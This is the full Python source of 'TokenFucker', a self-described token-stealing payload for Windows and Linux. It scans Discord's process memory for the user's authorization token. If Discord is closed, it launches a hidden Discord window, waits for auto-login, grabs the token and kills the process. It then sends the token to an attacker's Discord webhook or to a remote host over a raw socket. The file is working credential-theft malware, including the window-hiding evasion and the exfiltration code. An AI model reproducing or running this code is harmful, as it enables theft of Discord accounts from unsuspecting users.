#!/usr/bin/python3

import argparse
import os
import re
import socket
import subprocess
import sys
import time
import psutil
import platform
import pathlib
if platform.system() == "Linux":
    import pwd
from multiprocessing import Process
from typing import Tuple, Any, List
from threading import *
from discord_webhook import DiscordWebhook
from termcolor import colored
from ctypes import *

# Banner
banner = colored(r"""
___________     __                 ___________             __
\__    ___/___ |  | __ ____   ____ \_   _____/_ __   ____ |  | __ ___________
  |    | /  _ \|  |/ // __ \ /    \ |    __)|  |  \_/ ___\|  |/ // __ \_  __ \
  |    |(  <_> )    <\  ___/|   |  \|     \ |  |  /\  \___|    <\  ___/|  | \/
  |____| \____/|__|_ \\___  >___|  /\___  / |____/  \___  >__|_ \\___  >__|
                    \/    \/     \/     \/              \/     \/    \/
""", 'blue', attrs=["bold"])

if platform.system() == "Windows":
    from ctypes.wintypes import *

    # Defines some data types
    LPBYTE = POINTER(c_ubyte)
    LPTSTR = POINTER(c_char)
    HANDLE = c_void_p
    WNDENUMPROC = WINFUNCTYPE(
        BOOL,
        HWND,  # _In_ hWnd
        LPARAM,
    )  # _In_ lParam

    # Defines EnumWindow Function Argtypes
    windll.user32.EnumWindows.argtypes = (
        WNDENUMPROC,  # _In_ lpEnumFunc
        LPARAM,)  # _In_ lParam

    # Defines StartupInfo Structure
    class STARTUPINFO(Structure):
        _fields_ = [
            ("cb", DWORD),
            ("lpReserved", LPTSTR),
            ("lpDesktop", LPTSTR),
            ("lpTitle", LPTSTR),
            ("dwX", DWORD),
            ("dwY", DWORD),
            ("dwXSize", DWORD),
            ("dwYSize", DWORD),
            ("dwXCountChars", DWORD),
            ("dwYCountChars", DWORD),
            ("dwFillAttribute", DWORD),
            ("dwFlags", DWORD),
            ("wShowWindow", WORD),
            ("cbReserved2", WORD),
            ("lpReserved2", LPBYTE),
            ("hStdInput", HANDLE),
            ("hStdOutput", HANDLE),
            ("hStdError", HANDLE),
        ]

    # Defines Process Information Structure
    class ProcessInformation(Structure):
        _fields_ = [
            ("hProcess", HANDLE),
            ("hThread", HANDLE),
            ("dwProcessId", DWORD),
            ("dwThreadId", DWORD),
        ]

    # Permissions for Process Handle
    permissions = {
        "PROCESS_QUERY_INFORMATION": 0x0400,
        "PROCESS_VM_OPERATION": 0x0008,
        "PROCESS_VM_READ": 0x0010,
        "PROCESS_VM_WRITE": 0x0020,
    }

    # Types of Region Memory
    memory_types = {
        'IMAGE': 0x1000000,
        'PRIVATE': 0x20000,
        'MAPPED': 0x40000,
    }

    # C Struct for GetSystemInfo Function
    class SystemInfo(Structure):
        _fields_ = [
            ('wProcessorArchitecture', WORD),
            ('wReserved', WORD),
            ('dwPageSize', DWORD),
            ('lpMinimumApplicationAddress', c_void_p),
            ('lpMaximumApplicationAddress', c_void_p),
            ('dwActiveProcessorMask', c_void_p),
            ('dwNumberOfProcessors', DWORD),
            ('dwProcessorType', DWORD),
            ('dwAllocationGranularity', DWORD),
            ('wProcessorLevel', WORD),
            ('wProcessorRevision', WORD),
        ]

    # C Struct of 32 Bits Memory Info
    class MemoryInfoStruct32(Structure):
        _fields_ = [
            ('BaseAddress', DWORD),
            ('AllocationBase', DWORD),
            ('AllocationProtect', DWORD),
            ('RegionSize', DWORD),
            ('State', DWORD),
            ('Protect', DWORD),
            ('Type', DWORD),
        ]

    # C Struct of 64 Bits Memory Info
    class MemoryInfoStruct64(Structure):
        _fields_ = [
            ('BaseAddress', c_ulonglong),
            ('AllocationBase', c_ulonglong),
            ('AllocationProtect', DWORD),
            ('__alignment1', DWORD),
            ('RegionSize', c_ulonglong),
            ('State', DWORD),
            ('Protect', DWORD),
            ('Type', DWORD),
            ('__alignment2', DWORD),
        ]

    # Hidden Process Thread Class
    class HiddenProcess(Thread):
        def __init__(self, process_id: int):
            Thread.__init__(self)
            self.process_id = process_id
            self.stopFlag = False

        def run(self) -> None:
            while not self.stopFlag:
                process_hwnd = WindowsProcess.find_window(self.process_id)
                # If you want to use HiddenProcess for another process, you need remove the next line
                updater_hwnd = windll.user32.FindWindowW(
                    None, "Discord Updater")
                # If you want to use HiddenProcess for another process, you need remove the next line
                windll.user32.ShowWindow(updater_hwnd, 0)  # This Line
                windll.user32.ShowWindow(process_hwnd, 0)

        def get_id(self):
            if hasattr(self, "_thread_id"):
                return self._thread_id

        def stop(self):
            self.stopFlag = True
            return

    # Windows Process Class
    class WindowsProcess:
        def __init__(self, process_id: int):
            # Get Process handle with OpenProcess
            self.process_handle = windll.kernel32.OpenProcess(
                permissions["PROCESS_QUERY_INFORMATION"] |
                permissions["PROCESS_VM_OPERATION"] |
                permissions["PROCESS_VM_READ"],
                False,
                process_id)

        def get_region_info(self, address: int,
                            memory_info: MemoryInfoStruct32 | MemoryInfoStruct64):
            """
            Get Memory Region Info

            Args:
                address (int): Memory Address
                memory_info (MemoryInfoStruct32 | MemoryInfoStruct64): A MemoryInfo C Struct to save the data.

            Returns:
                MemoryInfoStruct32 | MemoryInfoStruct64: The same MemoryInfo C Struct filled with the data.
            """
            memory_info_pointer = byref(
                memory_info)  # Getting the pointer pointing towards MemoryInfoStruct

            # Getting the size of MemoryInfoStruct
            memory_info_size = sizeof(memory_info)

            # Using VirtualQueryEx to get the RegionInfo
            virtual_query_ex = windll.kernel32.VirtualQueryEx(
                self.process_handle,
                c_void_p(address),
                memory_info_pointer,
                # Here we use the pointer for the function to fill with data our MemoryInfoStruct.
                memory_info_size)  # The size of the Structure so the Function know how much data fill.

            # If the sizes don't match we have an error.
            if virtual_query_ex != memory_info_size:
                print(
                    colored(
                        "! Error getting VirtualMemoryEx at address: {}".format(
                            address),
                        "red"))
                sys.exit(1)

            return memory_info

        def get_memory_regions(self, image=False, mapped=False, private=False) -> List[Tuple[int, int]]:
            """
            Map and Return all Memory Regions of a Process

            Returns:
                List: Containing tuples with (start_address, stop_address).
            """
            if image and not mapped and not private:
                memory_type = memory_types['IMAGE']
            elif mapped and not image and not private:
                memory_type = memory_types['MAPPED']
            elif private and not image and not mapped:
                memory_type = memory_types['PRIVATE']
            elif not private and not image and not mapped:
                memory_type = None
            else:
                raise ArgumentError("Only can use one flag at time")

            # Checking if Python is 64 or 32 Bits
            if sizeof(c_void_p) == 8:
                memory_info = MemoryInfoStruct64()  # Setting the MemoryInfoStruct for 64 bits
            else:
                memory_info = MemoryInfoStruct32()  # Setting the MemoryInfoStruct for 32 bits

            # Setting the SystemInfo struct for the output of the GetSystemInfo Function
            sys_info = SystemInfo()
            # Getting the pointer pointing towards MemoryInfoStruct
            sys_info_pointer = byref(sys_info)
            # Getting the size of MemoryInfoStruct
            windll.kernel32.GetSystemInfo(sys_info_pointer)

            # Getting the Minimum Application Address for our system.
            min_address = sys_info.lpMinimumApplicationAddress
            # Getting the Maximum Application Address for our system.
            max_address = sys_info.lpMaximumApplicationAddress

            regions = []

            address = min_address

            while address < max_address:
                # Getting region info for this address.
                region_info = self.get_region_info(address, memory_info)
                # Calculate End Address for this region.
                end_address = address + region_info.RegionSize
                if ((region_info.Type == memory_type or memory_type is None)
                        and region_info.State == 0x1000 and region_info.Protect & 0x20 | 0x40 | 0x04 != 0):
                    regions.append((address, end_address))  # Adding Address to List

                address += region_info.RegionSize  # Continue to next Region

            return regions

        def read_memory(self, address: int, size: int):
            """
            Read Memory data on a given address.

            Arguments:
                address (int): Memory Address to read
                size (int): Size of the data to read.

            Returns:
                Array[c_char]: Readed Buffer
            """
            o_buffer = create_string_buffer(size)  # Setting the Buffer

            windll.kernel32.ReadProcessMemory(
                self.process_handle,
                c_void_p(address),
                byref(o_buffer),  # Pointer for the buffer
                sizeof(o_buffer),  # Size of Buffer
                None)

            return o_buffer

        @staticmethod
        def find_window(pid: int) -> int | None:
            """
            Get HWND of one Process ID.

            Arguments:
                pid (int): Process Id to search

            Returns:
                int: HWND
            """
            result = None

            @WNDENUMPROC
            def callback(hwnd, _):
                nonlocal result
                lpdw_process_id = c_ulong()
                windll.user32.GetWindowThreadProcessId(
                    hwnd, byref(lpdw_process_id))
                if lpdw_process_id.value == pid:
                    result = hwnd
                    return False
                return True

            windll.user32.EnumWindows(callback, 0)
            return result

        @staticmethod
        def create_hide_process(exe_path: str) -> tuple[HiddenProcess, Any]:
            """
            Creates Hidden Window Process.

            Arguments:
                exe_path (str): Path of Executable

            Returns:
                Thread: Thread Handle of the Hide Process Function
            """
            sw_hide = 0
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = sw_hide

            process = subprocess.Popen(
                [exe_path, "--start-minimized"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                startupinfo=info,
                shell=False)  # Creating Process

            h_process = HiddenProcess(process.pid)  # Define Hidden Process Class

            h_process.start()  # Starting to Hide Process

            return h_process, process.pid


# Exception Handler
class ExceptionHandler(Exception):

    # Exception Handler for when Discord binary is not found by TokenFucker
    @staticmethod
    def discord_not_found():
        msg = colored(
            '[X] Discord App Not Found or Access Denied\n(Remember you can define a Discord App Path with the -df '
            'option)',
            "red")
        print(msg)
        sys.exit(1)

    # Exception Handler for when the introduced Discord Binary Path not exists
    @staticmethod
    def file_not_exist():
        msg = colored(
            '[X] Introduced Discord File not exist',
            "red")
        print(msg)
        sys.exit(1)

    # Exception Handler for when the connection to the webhook failed
    @staticmethod
    def fail_connecting_to_webhook():
        msg = colored(
            '[X] Fail connecting to WebHook',
            'red'
        )
        print(msg)
        sys.exit(1)

    # Exception Handler for when the connection to the remote host failed
    @staticmethod
    def connection_failed():
        msg = colored(
            '[X] Failed to connect to the Remote Host',
            'red'
        )
        print(msg)
        sys.exit(1)

    # Exception Handler for when the remote host option is bad formatted or introduced
    @staticmethod
    def wrong_remotehost_input():
        msg = colored(
            '[X] Wrong Remote Host Input',
            'red'
        )
        print(msg)
        sys.exit(1)

    # Exception Handler for when the User Token is not found in the memory
    @staticmethod
    def token_not_found():
        msg = colored(
            '[X] Token not found. Try restarting discord app or checking for new updates of TokenFucker',
            'red'
        )
        print(msg)
        sys.exit(1)

    # Exception Handler for when the app is not running as root on Linux Systems
    @staticmethod
    def not_root_permissions():
        msg = colored(
            '[X] TokenFucker need to be executed as root on Linux Systems',
            'red'
        )
        print(msg)
        sys.exit(1)


# Linux Process Class
class LinuxProcess:
    def __init__(self, process_id: int):
        self.process_id = process_id

    def get_memory_regions(self, read_only=False) -> List[Tuple[int, int]]:
        """
        Map and Return all Memory Regions of a Process

        Returns:
            List: Containing tuples with (start_address, stop_address).
        """
        regions = []

        with open("/proc/{}/maps".format(self.process_id), "r") as proc_map:
            for line in proc_map.readlines():
                region, privileges = line.split()[0:2]

                if "r" not in privileges and read_only:  # If page don't have read privileges, continue
                    continue

                region_start = int(region.split("-")[0], 16)
                region_end = int(region.split("-")[1], 16)
                regions.append((region_start, region_end))

        return regions

    def read_memory(self, address: int, size: int):
        """
        Read Memory data on a given address.

        Arguments:
            address (int): Memory Address to read
            size (int): Size of the data to read.

        Returns:
            Array[c_char]: Readed Buffer
        """
        o_buffer = create_string_buffer(size)  # Setting the Buffer

        with open("/proc/{}/mem".format(self.process_id), 'rb+') as memory:
            memory.seek(address)
            memory.readinto(o_buffer)

        return o_buffer


# Class for Windows OS
class Windows:
    def __init__(self, discord_path=None):
        self.discordPID = None
        self.discordBin = None

        # Getting Process Info to Check if Discord is open
        process_info = process_checker()

        # Making some checking
        if process_info is not None:
            self.discordPID = process_info[0]
        elif discord_path is not None:
            path = str(pathlib.Path(discord_path))

            if os.path.exists(path):
                self.discordBin = path
            ExceptionHandler().file_not_exist()
        else:
            self.discordBin = self.get_discord_exe()

            if self.discordBin is None:
                ExceptionHandler().discord_not_found()

    # Function to extract Discord Token From Memory
    def extract_token(self) -> str:
        p_handle = WindowsProcess(self.discordPID)
        addresses = p_handle.get_memory_regions()

        reference = "417574686f72697a6174696f6e0000004e00000046000000"

        reference_regex = re.compile(bytes().fromhex(reference) + rb'\S{70}')

        for start, stop in addresses:
            region_size = stop - start

            try:
                buffer = p_handle.read_memory(start, region_size).raw
                search = reference_regex.search(buffer)

                if search is not None:
                    token = search.group(0).hex().replace(reference, "")
                    token = bytes.fromhex(token).decode("UTF-8")
                    return token
            except OSError:
                pass

        ExceptionHandler().token_not_found()

    def run(self):
        if self.discordPID is not None:
            token = self.extract_token()
            return token
        elif self.discordBin is not None:
            h_process = WindowsProcess.create_hide_process(
                self.discordBin)  # Creating Hidden Discord Process

            time.sleep(10)  # Giving Grace Time to Automatic Discord App Login

            self.discordPID = h_process[1]  # Defines new Discord Process ID
            token = self.extract_token()  # Extracting Discord Token
            os.kill(self.discordPID, 9)  # Killing Created Discord Process
            h_process[0].stop()  # Stopping Hidden Process Thread
            h_process[0].join()  # Waiting for the Stop
            return token

    # Get Discord executable by default path
    @staticmethod
    def get_discord_exe() -> str | None:
        discord_path = pathlib.Path(os.environ["LOCALAPPDATA"] + "/Discord")
        app_regex = re.compile(r'app-[0-9]\.[0-9]\.[0-9]{0,20}')
        apps_list = []

        try:
            for item in os.scandir(str(discord_path)):
                if item.is_dir() and app_regex.match(item.name) is not None:
                    apps_list.append((item.name, item.stat().st_mtime))
        except (FileNotFoundError, PermissionError):
            ExceptionHandler().discord_not_found()

        if len(apps_list) == 1:
            return str(discord_path) + f"\\{apps_list[0][0]}\\Discord.exe"
        elif len(apps_list) > 1:
            most_recent = None

            for app in apps_list:
                if most_recent is None:
                    most_recent = app
                elif app[1] > most_recent[1]:
                    most_recent = app
            return str(discord_path) + f"\\{most_recent[0]}\\Discord.exe"
        else:
            return None


# Class for Linux OS
class Linux:
    def __init__(self, discord_path=None, no_root=False):
        self.discordPID = None
        self.discordBin = None

        # Checking root permissions
        if not self.check_root() and not no_root:
            ExceptionHandler().not_root_permissions()

        # Getting Process Info to Check if Discord is open
        process_info = process_checker()

        if process_info is not None:
            self.discordPID = process_info[0]
        elif discord_path is not None:
            path = str(pathlib.Path(discord_path))

            if os.path.exists(path):
                self.discordBin = path
            else:
                ExceptionHandler().file_not_exist()

    # Function to extract Discord Token From Memory
    def extract_token(self) -> str | None:
        p_handle = LinuxProcess(self.discordPID)
        addresses = p_handle.get_memory_regions(read_only=True)

        reference = "417574686f72697a6174696f6e0000004e00000046000000"

        reference_regex = re.compile(bytes().fromhex(reference) + rb'\S{70}')

        for start, stop in addresses:
            region_size = stop - start

            try:
                buffer = p_handle.read_memory(start, region_size).raw
                search = reference_regex.search(buffer)

                if search is not None:
                    token = search.group(0).hex().replace(reference, "")
                    token = bytes.fromhex(token).decode("UTF-8")
                    return token
            except OSError:
                pass
        return None

    # Function to execute app as normal user
    def execute_as_normal_user(self, command: str) -> None:
        username = self.get_normal_user()  # Getting Username Without Privileges
        pw_record = pwd.getpwnam(username)
        homedir = pw_record.pw_dir  # Getting Unprivileged User homedir
        user_uid = pw_record.pw_uid  # Getting Unprivileged User user uid
        user_gid = pw_record.pw_gid  # Getting Unprivileged User user gid
        env = os.environ.copy()  # Cloning Current Environment Vars
        env.update({'HOME': homedir,
                    'LOGNAME': username,
                    'PWD': os.getcwd(),
                    'FOO': 'bar',
                    'USER': username})  # Updating Environment Vars

        # execute the command
        subprocess.Popen([command],
                         shell=True,
                         env=env,
                         preexec_fn=self.change_proc_permissions(user_uid, user_gid),
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)

        return

    # Function to run token steal
    def run(self):
        if self.discordPID is not None:
            token = self.extract_token()

            if token is None:
                ExceptionHandler().token_not_found()
            return token
        elif self.discordBin is None:

            if not self.check_discord_command():
                ExceptionHandler().discord_not_found()

            proc = Process(target=self.execute_as_normal_user, args=("discord --start-minimized",))
            proc.start()
            proc.join()

            time.sleep(10)  # Giving Grace Time to Automatic Discord App Login

            self.discordPID = process_checker()[0]  # Defines new Discord Process ID
            token = self.extract_token()  # Extracting Discord Token

            if token is None:
                os.kill(self.discordPID, 9)  # Killing Created Discord Process
                ExceptionHandler().token_not_found()

            os.kill(self.discordPID, 9)  # Killing Created Discord Process
            return token
        else:
            # Creating Unprivileged Subprocess to run discord
            proc = Process(target=self.execute_as_normal_user, args=(f"{self.discordBin} --start-minimized",))
            proc.start()  # Starting Subprocess
            proc.join()  # Waiting for a function end

            time.sleep(10)  # Giving Grace Time to Automatic Discord App Login

            self.discordPID = process_checker()[0]  # Defines new Discord Process ID
            token = self.extract_token()  # Extracting Discord Token

            if token is None:
                os.kill(self.discordPID, 9)  # Killing Created Discord Process
                ExceptionHandler().token_not_found()

            os.kill(self.discordPID, 9)  # Killing Created Discord Process
            return token

    # Function to get normal user
    @staticmethod
    def get_normal_user():
        passwd = open("/etc/passwd", 'r').readlines()

        for line in passwd:
            if ("root" not in line and "/home/" in line and "/usr/sbin/nologin" not in line) or \
                    ("root" not in line and "/bin/bash" in line):
                return line.split(":")[0]

    # Function to convert change process execution permissions
    @staticmethod
    def change_proc_permissions(user_uid, user_gid):
        def result():
            os.setgid(user_gid)
            os.setuid(user_uid)

        return result

    # Function to check root permissions
    @staticmethod
    def check_root() -> bool:
        if os.getuid() == 0:
            return True
        else:
            return False

    # Function to check if discord command exist
    @staticmethod
    def check_discord_command():
        try:
            subprocess.check_output("which discord", shell=True)
            return True
        except subprocess.CalledProcessError:
            return False


# Function for Search Discord Process
def process_checker() -> tuple[int, str, str] | None:
    if get_os() == "Windows":
        process_name = "Discord.exe"
    else:
        process_name = "Discord"

    for proc in psutil.process_iter():
        try:
            if proc.name() == process_name and proc.parent().name() != process_name:
                pid = proc.pid
                path = proc.exe()
                return pid, path, process_name
        except:
            pid = proc.pid
            path = proc.exe()
            return pid, path, process_name
    return None


# Function to Get System OS
def get_os() -> str:
    return platform.system()


# Function to Send Result to Webhook
def send_to_webhook(url: str, token: str) -> None:
    webhook = DiscordWebhook(
        url=url,
        rate_limit_retry=True,
        content="Powered By TokenFucker\nToken: {}".format(token))
    try:
        response = webhook.execute()
    except:
        ExceptionHandler().fail_connecting_to_webhook()

    if response.status_code == 400:
        ExceptionHandler().fail_connecting_to_webhook()

    print(colored('[*] Token Submitted Successfully', 'green', attrs=['bold']))
    return


# Function to Send Result with Socket
def send_to_host(host: str, port: int, token: str) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((host, port))
        data = "Powered By TokenFucker\nToken: {}\n".format(token)
        s.send(bytes(data, "UTF-8"))
        s.close()

        print(
            colored(
                '[*] Token Submitted Successfully',
                'green',
                attrs=['bold']))
        return
    except:
        ExceptionHandler().connection_failed()


# Function to Output the Result
def output(token: str) -> None:
    msg = "{}{}{}".format(
        colored(
            'Discord Token Obtained Successfully\n',
            'green',
            attrs=['bold']),
        colored(
            'Token: ',
            'blue',
            attrs=['bold']),
        colored(
            token,
            'red'))
    print(msg)
    return


# Main Function
def main() -> None:
    # Print Banner
    print(banner)

    # Description to Argparse
    msg = "Token Stealing Payload for Windows and Linux"

    # Initialize Argument Parser
    parser = argparse.ArgumentParser(description=msg)

    # Adding Arguments
    parser.add_argument(
        "-r",
        "--run",
        action='store_true',
        help="Run the Token Stealing")
    parser.add_argument(
        "--no-root",
        action='store_true',
        help="Disable root checking on Linux Systems (The steal may not work properly)")
    parser.add_argument(
        "-df",
        "--discord-file",
        type=str,
        help="Enter Discord.exe file manually")
    parser.add_argument(
        "-wh",
        "--webhook-url",
        type=str,
        help="Send Result to Webhook")
    parser.add_argument(
        "-rh",
        "--remote-host",
        help=(
            "Send to Remote Host (Introduce Host and Port separated by comma) Example: python tokenfucker.py -rh "
            "127.0.0.1,443"))

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    # Parse Args
    args = parser.parse_args()
    if args.run:
        if get_os() == "Windows":
            discord_win = Windows(discord_path=args.discord_file)
            token = discord_win.run()

            if args.webhook_url is not None:
                send_to_webhook(args.webhook_url, token)
            elif args.remote_host is not None:
                try:
                    host = args.remote_host.split(",")[0]
                    port = int(args.remote_host.split(",")[1])
                except (IndexError, ValueError):
                    ExceptionHandler().wrong_remotehost_input()
                send_to_host(host, port, token)
            else:
                output(token)
        else:
            discord_linux = Linux(discord_path=args.discord_file, no_root=args.no_root)
            token = discord_linux.run()
            output(token)

    else:
        print('Specify -r option to run')


if __name__ == "__main__":
    main()
